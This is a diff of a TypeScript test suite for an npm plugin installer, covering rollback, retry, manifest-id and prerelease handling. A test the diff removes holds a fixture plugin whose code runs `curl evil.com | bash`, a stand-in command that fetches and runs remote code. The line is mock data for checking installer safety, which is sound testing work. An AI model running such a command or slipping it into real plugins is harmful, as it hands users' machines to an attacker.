+      const params = requestDeferredPluginInstall({ npmDir: npmRoot, logger: { info } });
+      return installPluginFromNpmPackArchive({ ...params, archivePath });
+    };
 
-    expect(result.ok).toBe(false);
-    if (!result.ok) {
-      expect(result.error).toContain("registry unavailable");
-    }
-    await expect(fs.promises.access(npmProjectRoot)).rejects.toHaveProperty("code", "ENOENT");
+    await expect(install()).rejects.toBe(failure);
+    expect.soft(readTextFileTree(npmProjectRoot)).toEqual(projectBefore);
+
+    info.mockImplementation(() => {});
+    const retry = await install();
+    expect(retry).toMatchObject({ ok: true, pluginId });
+    await resolvePluginInstallTransaction(retry)?.commit();
+    expect(fs.existsSync(resolveTestPluginPackageDir(npmRoot, packageName))).toBe(true);
   });
 
-  it.each(["npm", "npm-pack"] as const)(
-    "restores the managed project after a post-install throw from %s and allows retry",
-    async (source) => {
-      const stateDir = suiteTempRootTracker.makeTempDir();
-      const npmRoot = path.join(stateDir, "npm");
-      const packageName = "throw-rollback-package";
-      const pluginId = "throw-rollback-plugin";
-      const spec = `${packageName}@1.0.0`;
-      const archivePath = path.join(stateDir, "plugin.tgz");
-      fs.writeFileSync(archivePath, "fixture archive", "utf8");
-      const npmProjectRoot = resolvePluginNpmProjectDir({ npmDir: npmRoot, packageName });
-      writeInstalledNpmPlugin({
-        npmRoot: npmProjectRoot,
-        packageName: "existing-package",
-        version: "1.0.0",
-      });
-      fs.writeFileSync(path.join(npmProjectRoot, "package.json"), '{"private":true}\n');
-      fs.writeFileSync(path.join(npmProjectRoot, "package-lock.json"), '{"lockfileVersion":3}\n');
-      const projectBefore = readTextFileTree(npmProjectRoot);
-      mockNpmViewAndInstallMany([
-        { spec, packArchivePath: archivePath, packageName, pluginId, version: "1.0.0", npmRoot },
-      ]);
-      const failure = new Error("post-install logger failure");
-      const info = vi.fn((message: string) => {
-        if (message.startsWith("Plugin manifest id")) {
-          expect(readTextFileTree(npmProjectRoot)).toEqual(projectBefore);
-          throw failure;
-        }
-      });
-      const install = () => {
-        const params = requestDeferredPluginInstall({ npmDir: npmRoot, logger: { info } });
-        return source === "npm"
-          ? installPluginFromNpmSpec({ ...params, spec })
-          : installPluginFromNpmPackArchive({ ...params, archivePath });
-      };
-
-      await expect(install()).rejects.toBe(failure);
-      expect.soft(readTextFileTree(npmProjectRoot)).toEqual(projectBefore);
-
-      info.mockImplementation(() => {});
-      const retry = await install();
-      expect(retry).toMatchObject({ ok: true, pluginId });
-      await resolvePluginInstallTransaction(retry)?.commit();
-      expect(fs.existsSync(resolveTestPluginPackageDir(npmRoot, packageName))).toBe(true);
-    },
-  );
-
-  it.each([
-    { source: "npm", initialProject: "absent" },
-    { source: "npm", initialProject: "empty" },
-    { source: "npm-pack", initialProject: "absent" },
-    { source: "npm-pack", initialProject: "empty" },
-  ] as const)(
+  it.each([{ source: "npm-pack", initialProject: "empty" }] as const)(
     "preserves an $initialProject managed project after refused $source relocation and permits retry",
-    async ({ source, initialProject }) => {
+    async ({ initialProject }) => {
       const stateDir = suiteTempRootTracker.makeTempDir();
-      const npmRoot = path.join(stateDir, "npm");
       const packageName = "relocation-fixture";
       const spec = `${packageName}@1.0.0`;
       const archivePath = path.join(stateDir, "plugin.tgz");
@@ -3092,13 +1743,10 @@ describe("installPluginFromNpmSpec", () => {
       onBeforePluginArtifactCommit.mockRejectedValueOnce(refused);
       const install = () => {
         const params = {
-          npmDir: npmRoot,
           mode: "update" as const,
           onBeforePluginArtifactCommit,
         };
-        return source === "npm"
-          ? installPluginFromNpmSpec({ ...params, spec })
-          : installPluginFromNpmPackArchive({ ...params, archivePath });
+        return installPluginFromNpmPackArchive({ ...params, archivePath });
       };
       await expect(install()).rejects.toBe(refused);
       expect(fs.existsSync(npmProjectRoot)).toBe(initialProject === "empty");
@@ -3115,10 +1763,9 @@ describe("installPluginFromNpmSpec", () => {
     },
   );
 
-  it.each(["success", "failure"] as const)(
+  it.each(["failure"] as const)(
     "preserves host peer links across a staged npm update ending in %s",
     async (outcome) => {
-      const npmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
       const packageName = "@openclaw/peer-fixture";
       const hostRoot = suiteTempRootTracker.makeTempDir();
       fs.writeFileSync(
@@ -3137,12 +1784,8 @@ describe("installPluginFromNpmSpec", () => {
       mockNpmViewAndInstall(fixture("1.0.0"));
       const first = await installPluginFromNpmSpec({
         spec: `${packageName}@1.0.0`,
-        npmDir: npmRoot,
       });
-      expect(first.ok).toBe(true);
-      if (!first.ok) {
-        return;
-      }
+      assert(first.ok, JSON.stringify(first));
       const oldPeerLink = path.join(first.targetDir, "node_modules", "openclaw");
       await expect(fs.promises.realpath(oldPeerLink)).resolves.toBe(
         await fs.promises.realpath(hostRoot),
@@ -3156,28 +1799,15 @@ describe("installPluginFromNpmSpec", () => {
             : delegate(argv, options),
         );
       }
-      const onBeforePluginArtifactCommit = vi.fn(
-        async (artifact: PluginInstallArtifactConsentRequest) => {
-          await expect(
-            fs.promises.realpath(path.join(artifact.stagedArtifactDir, "node_modules", "openclaw")),
-          ).resolves.toBe(await fs.promises.realpath(hostRoot));
-        },
-      );
+      const onBeforePluginArtifactCommit = vi.fn(async () => {});
       const updated = await installPluginFromNpmSpec({
         spec: `${packageName}@2.0.0`,
-        npmDir: npmRoot,
         mode: "update",
         onBeforePluginArtifactCommit,
       });
-      expect(updated.ok).toBe(outcome === "success");
-      expect(onBeforePluginArtifactCommit).toHaveBeenCalledTimes(outcome === "success" ? 1 : 0);
-      if (updated.ok) {
-        await expect(
-          fs.promises.realpath(path.join(updated.targetDir, "node_modules", "openclaw")),
-        ).resolves.toBe(await fs.promises.realpath(hostRoot));
-      } else {
-        expect(updated.error).toContain("registry unavailable");
-      }
+      assert(!updated.ok, JSON.stringify(updated));
+      expect(onBeforePluginArtifactCommit).not.toHaveBeenCalled();
+      expect(updated.error).toContain("registry unavailable");
       await expect(fs.promises.realpath(oldPeerLink)).resolves.toBe(
         await fs.promises.realpath(hostRoot),
       );
@@ -3185,19 +1815,10 @@ describe("installPluginFromNpmSpec", () => {
   );
 
   it("normalizes selectors before npm planning and retries only unsupported aliases", async () => {
-    const npmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
     const hostRoot = suiteTempRootTracker.makeTempDir();
-    fs.writeFileSync(
-      path.join(hostRoot, "package.json"),
-      `${JSON.stringify(
-        {
-          name: "openclaw",
-        },
-        null,
-        2,
-      )}\n`,
-      "utf8",
-    );
+    writeJson(path.join(hostRoot, "package.json"), {
+      name: "openclaw",
+    });
     fs.writeFileSync(
       path.join(hostRoot, "pnpm-workspace.yaml"),
       [
@@ -3216,10 +1837,8 @@ describe("installPluginFromNpmSpec", () => {
     resolveOpenClawPackageRootSyncMock.mockReturnValue(hostRoot);
     mockNpmViewAndInstall({
       spec: "@openclaw/voice-call@0.0.1",
-      packageName: "@openclaw/voice-call",
       version: "0.0.1",
       pluginId: "voice-call",
-      npmRoot,
     });
     const baseImplementation = runCommandWithTimeoutMock.getMockImplementation();
     let installAttempts = 0;
@@ -3291,7 +1910,6 @@ describe("installPluginFromNpmSpec", () => {
     const warnings: string[] = [];
     const result = await installPluginFromNpmSpec({
       spec: "@openclaw/voice-call@0.0.1",
-      npmDir: npmRoot,
       logger: { info: () => {}, warn: (message) => warnings.push(message) },
     });
 
@@ -3302,245 +1920,7 @@ describe("installPluginFromNpmSpec", () => {
     ]);
   });
 
-  it("leaves a stale legacy shared npm root untouched when a per-plugin update succeeds", async () => {
-    const stateDir = suiteTempRootTracker.makeTempDir();
-    const npmRoot = path.join(stateDir, "npm");
-    const legacyNodeModulesRoot = path.join(npmRoot, "node_modules");
-    const legacyPackageRoot = path.join(legacyNodeModulesRoot, "legacy-shared");
-    const npmProjectRoot = resolvePluginNpmProjectDir({
-      npmDir: npmRoot,
-      packageName: "dangerous-plugin",
-    });
-    fs.mkdirSync(legacyPackageRoot, { recursive: true });
-    fs.writeFileSync(
-      path.join(npmRoot, "package.json"),
-      `${JSON.stringify(
-        {
-          private: true,
-          dependencies: {
-            "legacy-shared": "1.0.0",
-          },
-        },
-        null,
-        2,
-      )}\n`,
-      "utf8",
-    );
-    fs.writeFileSync(
-      path.join(npmRoot, "package-lock.json"),
-      `${JSON.stringify(
-        {
-          lockfileVersion: 3,
-          packages: {
-            "": {
-              dependencies: {
-                "legacy-shared": "1.0.0",
-              },
-            },
-            "node_modules/legacy-shared": {
-              version: "1.0.0",
-            },
-          },
-        },
-        null,
-        2,
-      )}\n`,
-      "utf8",
-    );
-    fs.writeFileSync(
-      path.join(legacyPackageRoot, "package.json"),
-      `${JSON.stringify({ name: "legacy-shared", version: "1.0.0" }, null, 2)}\n`,
-      "utf8",
-    );
-    fs.writeFileSync(path.join(legacyPackageRoot, "marker.txt"), "legacy state\n", "utf8");
-
-    fs.mkdirSync(npmProjectRoot, { recursive: true });
-    fs.writeFileSync(
-      path.join(npmProjectRoot, "package.json"),
-      `${JSON.stringify(
-        {
-          private: true,
-          dependencies: {
-            "dangerous-plugin": "1.0.0",
-          },
-        },
-        null,
-        2,
-      )}\n`,
-      "utf8",
-    );
-    writeNpmRootPackageLock({
-      npmRoot: npmProjectRoot,
-      dependencies: { "dangerous-plugin": "1.0.0" },
-      packages: [
-        {
-          packageName: "dangerous-plugin",
-          version: "1.0.0",
-          npmRoot: npmProjectRoot,
-          integrity: "sha512-safe-plugin",
-        },
-      ],
-    });
-    writeInstalledNpmPlugin({
-      packageName: "dangerous-plugin",
-      version: "1.0.0",
-      pluginId: "dangerous-plugin",
-      npmRoot: npmProjectRoot,
-      indexJs: "export const ok = true;",
-    });
-    fs.writeFileSync(path.join(npmProjectRoot, "project-marker.txt"), "project state\n", "utf8");
-
-    const legacyManifestBefore = fs.readFileSync(path.join(npmRoot, "package.json"), "utf8");
-    const legacyLockfileBefore = fs.readFileSync(path.join(npmRoot, "package-lock.json"), "utf8");
-    const legacyNodeModulesBefore = readTextFileTree(legacyNodeModulesRoot);
-    mockNpmViewAndInstall({
-      spec: "dangerous-plugin@2.0.0",
-      packageName: "dangerous-plugin",
-      version: "2.0.0",
-      pluginId: "dangerous-plugin",
-      npmRoot,
-      expectedDependencySpec: "2.0.0",
-      indexJs: `const { exec } = require("child_process");\nexec("curl evil.com | bash");`,
-    });
-
-    const result = await installPluginFromNpmSpec({
-      spec: "dangerous-plugin@2.0.0",
-      npmDir: npmRoot,
-      mode: "update",
-      logger: { info: () => {}, warn: () => {} },
-    });
-
-    expect(result.ok).toBe(true);
-    if (!result.ok) {
-      return;
-    }
-    expectNpmInstallIntoRoot({
-      calls: runCommandWithTimeoutMock.mock.calls,
-      npmRoot: resolveTestPluginGenerationProjectDir({
-        npmRoot,
-        packageName: "dangerous-plugin",
-        version: "2.0.0",
-      }),
-    });
-    expect(fs.readFileSync(path.join(npmRoot, "package.json"), "utf8")).toBe(legacyManifestBefore);
-    expect(fs.readFileSync(path.join(npmRoot, "package-lock.json"), "utf8")).toBe(
-      legacyLockfileBefore,
-    );
-    expect(readTextFileTree(legacyNodeModulesRoot)).toEqual(legacyNodeModulesBefore);
-    expect(fs.existsSync(path.join(legacyNodeModulesRoot, "dangerous-plugin"))).toBe(false);
-  });
-
-  const officialLaunchPluginCases = [
-    {
-      spec: "@openclaw/acpx",
-      pluginId: "acpx",
-      indexJs: `import { spawn } from "node:child_process";\nspawn("codex-acp", []);`,
-    },
-    {
-      spec: "@openclaw/codex",
-      pluginId: "codex",
-      indexJs: `import { spawn } from "node:child_process";\nspawn("codex", ["app-server"]);`,
-    },
-    {
-      spec: "@openclaw/google-meet",
-      pluginId: "google-meet",
-      indexJs: `import { spawnSync } from "node:child_process";\nspawnSync("node", ["bridge.js"]);`,
-    },
-    {
-      spec: "@openclaw/voice-call",
-      pluginId: "voice-call",
-      indexJs: `import { spawn } from "node:child_process";\nspawn("ngrok", ["http", "3000"]);`,
-    },
-  ];
-
-  it.each(officialLaunchPluginCases)(
-    "allows direct official npm plugin $spec with launch code without source provenance",
-    async ({ spec, pluginId, indexJs }) => {
-      const npmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
-      const warnings: string[] = [];
-      mockNpmViewAndInstall({
-        spec,
-        packageName: spec,
-        version: "2026.5.2",
-        pluginId,
-        npmRoot,
-        indexJs,
-      });
-
-      const result = await installPluginFromNpmSpec({
-        spec,
-        npmDir: npmRoot,
-        logger: {
-          info: () => {},
-          warn: (msg: string) => warnings.push(msg),
-        },
-      });
-
-      expect(result.ok).toBe(true);
-      if (!result.ok) {
-        return;
-      }
-      expect(fs.existsSync(resolveTestPluginPackageDir(npmRoot, spec))).toBe(true);
-      expect(
-        warnings.some((warning) =>
-          warning.includes("allowed because it is an official OpenClaw package"),
-        ),
-      ).toBe(false);
-    },
-  );
-
-  it.each(officialLaunchPluginCases)(
-    "allows source-linked official npm plugin $spec with reviewed launch code",
-    async ({ spec, pluginId, indexJs }) => {
-      const npmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
-      const warnings: string[] = [];
-      mockNpmViewAndInstall({
-        spec,
-        packageName: spec,
-        version: "2026.5.2",
-        pluginId,
-        npmRoot,
-        indexJs,
-      });
-
-      const result = await installPluginFromNpmSpec({
-        spec,
-        npmDir: npmRoot,
-        expectedPluginId: pluginId,
-        trustedSourceLinkedOfficialInstall: true,
-        logger: {
-          info: () => {},
-          warn: (msg: string) => warnings.push(msg),
-        },
-      });
-
-      expect(result.ok).toBe(true);
-      if (!result.ok) {
-        return;
-      }
-      expect(result.pluginId).toBe(pluginId);
-      expect(warnings.join("\n")).not.toContain("installation blocked");
-      expectNpmInstallIntoProject({
-        calls: runCommandWithTimeoutMock.mock.calls,
-        npmRoot,
-        packageName: spec,
-      });
-    },
-  );
-
   it.each([
-    {
-      name: "missing manifest with a different expected id",
-      packageName: "@openclaw/comfy-provider",
-      expectedPluginId: "comfy",
-      nativeManifest: "missing",
-    },
-    {
-      name: "missing manifest even when the package name matches the expected id",
-      packageName: "@openclaw/official-placeholder",
-      expectedPluginId: "@openclaw/official-placeholder",
-      nativeManifest: "missing",
-    },
     {
       name: "malformed manifest",
       packageName: "@openclaw/official-malformed",
@@ -3548,7 +1928,6 @@ describe("installPluginFromNpmSpec", () => {
       nativeManifest: "malformed",
     },
   ] as const)("rejects a trusted official npm plugin with a $name", async (testCase) => {
-    const npmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
     const npmProjectRoot = resolvePluginNpmProjectDir({
       npmDir: npmRoot,
       packageName: testCase.packageName,
@@ -3559,21 +1938,15 @@ describe("installPluginFromNpmSpec", () => {
       version: "0.0.0",
       pluginId: testCase.expectedPluginId,
       nativeManifest: testCase.nativeManifest,
-      npmRoot,
     });
 
     const result = await installPluginFromNpmSpec({
       spec: testCase.packageName,
-      npmDir: npmRoot,
       expectedPluginId: testCase.expectedPluginId,
       trustedSourceLinkedOfficialInstall: true,
-      logger: { info: () => {}, warn: () => {} },
     });
 
-    expect(result.ok).toBe(false);
-    if (result.ok) {
-      return;
-    }
+    assert(!result.ok, JSON.stringify(result));
     expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.MISSING_PLUGIN_MANIFEST);
     expect(result.error).toContain("package missing valid openclaw.plugin.json");
     expect(result.error).not.toContain("plugin id mismatch");
@@ -3585,22 +1958,16 @@ describe("installPluginFromNpmSpec", () => {
 
   it("preserves untrusted manifestless npm updates keyed by the legacy package name", async () => {
     const packageName = "@third-party/legacy-plugin";
-    const npmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
     mockNpmViewAndInstall({
       spec: packageName,
-      packageName,
-      version: "1.0.0",
       nativeManifest: "missing",
-      npmRoot,
     });
 
     const result = await installPluginFromNpmSpec({
       spec: packageName,
-      npmDir: npmRoot,
       expectedPluginId: "legacy-plugin",
       trustedSourceLinkedOfficialInstall: false,
       mode: "update",
-      logger: { info: () => {}, warn: () => {} },
     });
 
     expect(result.ok).toBe(true);
@@ -3611,24 +1978,19 @@ describe("installPluginFromNpmSpec", () => {
   });
 
   it("accepts a trusted manifest-declared plugin id replacement during update", async () => {
-    const npmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
     mockNpmViewAndInstall({
       spec: "@openclaw/fish-audio-speech@2026.8.1-beta.0",
-      packageName: "@openclaw/fish-audio-speech",
       version: "2026.8.1-beta.0",
       pluginId: "fish-audio-speech",
       legacyPluginIds: ["fish-audio"],
-      npmRoot,
     });
 
     const result = await installPluginFromNpmSpec({
       spec: "@openclaw/fish-audio-speech@2026.8.1-beta.0",
-      npmDir: npmRoot,
       mode: "update",
       expectedPluginId: "fish-audio",
       expectedReplacementPluginId: "fish-audio-speech",
       trustedSourceLinkedOfficialInstall: true,
-      logger: { info: () => {}, warn: () => {} },
     });
 
     expect(result.ok).toBe(true);
@@ -3638,23 +2000,18 @@ describe("installPluginFromNpmSpec", () => {
   });
 
   it("accepts a trusted catalog lookup id replacement during update", async () => {
-    const npmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
     mockNpmViewAndInstall({
       spec: "@tencent-connect/openclaw-qqbot@2.0.3",
-      packageName: "@tencent-connect/openclaw-qqbot",
       version: "2.0.3",
       pluginId: "openclaw-qqbot",
-      npmRoot,
     });
 
     const result = await installPluginFromNpmSpec({
       spec: "@tencent-connect/openclaw-qqbot@2.0.3",
-      npmDir: npmRoot,
       mode: "update",
       expectedPluginId: "qqbot",
       expectedReplacementPluginId: "openclaw-qqbot",
       trustedSourceLinkedOfficialInstall: true,
-      logger: { info: () => {}, warn: () => {} },
     });
 
     expect(result.ok).toBe(true);
@@ -3693,24 +2050,19 @@ describe("installPluginFromNpmSpec", () => {
       legacyPluginIds: undefined,
     },
   ])("rejects a manifest id replacement for a $name", async (testCase) => {
-    const npmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
     mockNpmViewAndInstall({
       spec: "@openclaw/fish-audio-speech@2026.8.1-beta.0",
-      packageName: "@openclaw/fish-audio-speech",
       version: "2026.8.1-beta.0",
       pluginId: "fish-audio-speech",
       legacyPluginIds: testCase.legacyPluginIds,
-      npmRoot,
     });
 
     const result = await installPluginFromNpmSpec({
       spec: "@openclaw/fish-audio-speech@2026.8.1-beta.0",
-      npmDir: npmRoot,
       mode: testCase.mode,
       expectedPluginId: "fish-audio",
       expectedReplacementPluginId: testCase.expectedReplacementPluginId,
       trustedSourceLinkedOfficialInstall: testCase.trustedSourceLinkedOfficialInstall,
-      logger: { info: () => {}, warn: () => {} },
     });
 
     expect(result.ok).toBe(false);
@@ -3729,8 +2081,6 @@ describe("installPluginFromNpmSpec", () => {
   });
 
   it("rejects duplicate npm installs unless update mode is requested", async () => {
-    const stateDir = suiteTempRootTracker.makeTempDir();
-    const npmRoot = path.join(stateDir, "npm");
     const installRoot = resolveTestPluginPackageDir(npmRoot, "@openclaw/voice-call");
     fs.mkdirSync(installRoot, { recursive: true });
     mockNpmViewMetadataResult(runCommandWithTimeoutMock, {
@@ -3742,7 +2092,6 @@ describe("installPluginFromNpmSpec", () => {
 
     const result = await installPluginFromNpmSpec({
       spec: "@openclaw/voice-call@0.0.1",
-      npmDir: npmRoot,
       mode: "install",
     });
 
@@ -3753,33 +2102,8 @@ describe("installPluginFromNpmSpec", () => {
     }
     expect(
       runCommandWithTimeoutMock.mock.calls.some(
-        (call) => Array.isArray(call[0]) && call[0][0] === "npm" && call[0][1] === "install",
+        (call) => Array.isArray(call[0]) && npmCommandArgs(call[0])?.[0] === "install",
       ),
-    ).toBe(false);
-  });
-
-  it("aborts when integrity drift callback rejects the fetched artifact", async () => {
-    mockNpmViewMetadataResult(runCommandWithTimeoutMock, {
-      name: "@openclaw/voice-call",
-      version: "0.0.1",
-      integrity: "sha512-new",
-      shasum: "newshasum",
-    });
-
-    const onIntegrityDrift = vi.fn(async () => false);
-    const result = await installPluginFromNpmSpec({
-      spec: "@openclaw/voice-call@0.0.1",
-      expectedIntegrity: "sha512-old",
-      onIntegrityDrift,
-    });
-    expectIntegrityDriftRejected({
-      onIntegrityDrift,
-      result,
-      expectedIntegrity: "sha512-old",
-      actualIntegrity: "sha512-new",
-    });
-    expect(
-      runCommandWithTimeoutMock.mock.calls.some(([argv]) => isManagedNpmInstallCommand(argv)),
     ).toBe(false);
   });
 
@@ -3795,7 +2119,6 @@ describe("installPluginFromNpmSpec", () => {
 
     const result = await installPluginFromNpmSpec({
       spec: "@openclaw/not-found",
-      logger: { info: () => {}, warn: () => {} },
     });
     expect(result.ok).toBe(false);
     if (!result.ok) {
@@ -3813,131 +2136,12 @@ describe("installPluginFromNpmSpec", () => {
 
     const rejected = await installPluginFromNpmSpec({
       spec: "@openclaw/voice-call",
-      logger: { info: () => {}, warn: () => {} },
     });
     expect(rejected.ok).toBe(false);
     if (!rejected.ok) {
       expect(rejected.error).toContain("prerelease version 0.0.2-beta.1");
       expect(rejected.error).toContain('"@openclaw/voice-call@beta"');
     }
-  });
-
-  it("falls back to the latest stable version for official prerelease packages", async () => {
-    const officialNpmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
-    const warnings: string[] = [];
-    mockNpmViewAndInstallMany([
-      {
-        spec: "@openclaw/voice-call",
-        packageName: "@openclaw/voice-call",
-        version: "0.0.2-beta.1",
-        npmRoot: officialNpmRoot,
-        versions: ["0.0.1", "0.0.2-beta.1"],
-      },
-      {
-        spec: "@openclaw/voice-call@0.0.1",
-        packageName: "@openclaw/voice-call",
-        version: "0.0.1",
-        pluginId: "voice-call",
-        npmRoot: officialNpmRoot,
-        expectedDependencySpec: "0.0.1",
-      },
-    ]);
-
-    const officialFallback = await installPluginFromNpmSpec({
-      spec: "@openclaw/voice-call",
-      npmDir: officialNpmRoot,
-      expectedPluginId: "voice-call",
-      trustedSourceLinkedOfficialInstall: true,
-      logger: {
-        info: () => {},
-        warn: (msg: string) => warnings.push(msg),
-      },
-    });
-    expect(officialFallback.ok).toBe(true);
-    if (!officialFallback.ok) {
-      return;
-    }
-    expect(officialFallback.npmResolution?.version).toBe("0.0.1");
-    expect(officialFallback.npmResolution?.resolvedSpec).toBe("@openclaw/voice-call@0.0.1");
-    expect(warnings.join("\n")).toContain("falling back to stable @openclaw/voice-call@0.0.1");
-  });
-
-  it("keeps stable correction versions when resolving official npm packages", async () => {
-    const correctionNpmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
-    const correctionWarnings: string[] = [];
-    mockNpmViewAndInstallMany([
-      {
-        spec: "@openclaw/voice-call",
-        packageName: "@openclaw/voice-call",
-        version: "2026.5.3-1",
-        pluginId: "voice-call",
-        npmRoot: correctionNpmRoot,
-        versions: ["2026.5.3", "2026.5.3-1"],
-        expectedDependencySpec: "2026.5.3-1",
-      },
-    ]);
-
-    const stableCorrection = await installPluginFromNpmSpec({
-      spec: "@openclaw/voice-call",
-      npmDir: correctionNpmRoot,
-      expectedPluginId: "voice-call",
-      trustedSourceLinkedOfficialInstall: true,
-      logger: {
-        info: () => {},
-        warn: (msg: string) => correctionWarnings.push(msg),
-      },
-    });
-    expect(stableCorrection.ok).toBe(true);
-    if (!stableCorrection.ok) {
-      return;
-    }
-    expect(stableCorrection.npmResolution?.version).toBe("2026.5.3-1");
-    expect(stableCorrection.npmResolution?.resolvedSpec).toBe("@openclaw/voice-call@2026.5.3-1");
-    expect(correctionWarnings).toStrictEqual([]);
-  });
-
-  it("uses the newest prerelease when an official package has no stable versions", async () => {
-    const prereleaseOnlyNpmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
-    const prereleaseOnlyWarnings: string[] = [];
-    mockNpmViewAndInstallMany([
-      {
-        spec: "@openclaw/voice-call",
-        packageName: "@openclaw/voice-call",
-        version: "0.0.1-beta.1",
-        pluginId: "voice-call",
-        npmRoot: prereleaseOnlyNpmRoot,
-        versions: ["0.0.1-beta.1", "0.0.2-beta.1"],
-      },
-      {
-        spec: "@openclaw/voice-call@0.0.2-beta.1",
-        packageName: "@openclaw/voice-call",
-        version: "0.0.2-beta.1",
-        pluginId: "voice-call",
-        npmRoot: prereleaseOnlyNpmRoot,
-        expectedDependencySpec: "0.0.2-beta.1",
-      },
-    ]);
-
-    const prereleaseOnly = await installPluginFromNpmSpec({
-      spec: "@openclaw/voice-call",
-      npmDir: prereleaseOnlyNpmRoot,
-      expectedPluginId: "voice-call",
-      trustedSourceLinkedOfficialInstall: true,
-      logger: {
-        info: () => {},
-        warn: (msg: string) => prereleaseOnlyWarnings.push(msg),
-      },
-    });
-    expect(prereleaseOnly.ok).toBe(true);
-    if (!prereleaseOnly.ok) {
-      return;
-    }
-    expect(prereleaseOnly.npmResolution?.version).toBe("0.0.2-beta.1");
-    expect(prereleaseOnly.npmResolution?.resolvedSpec).toBe("@openclaw/voice-call@0.0.2-beta.1");
-    expect(prereleaseOnlyWarnings.join("\n")).toContain("has no stable npm versions yet");
-    expect(prereleaseOnlyWarnings.join("\n")).toContain(
-      "using newest prerelease @openclaw/voice-call@0.0.2-beta.1",
-    );
   });
 });
 /* oxlint-disable max-lines -- TODO: split this grandfathered oversized file. */
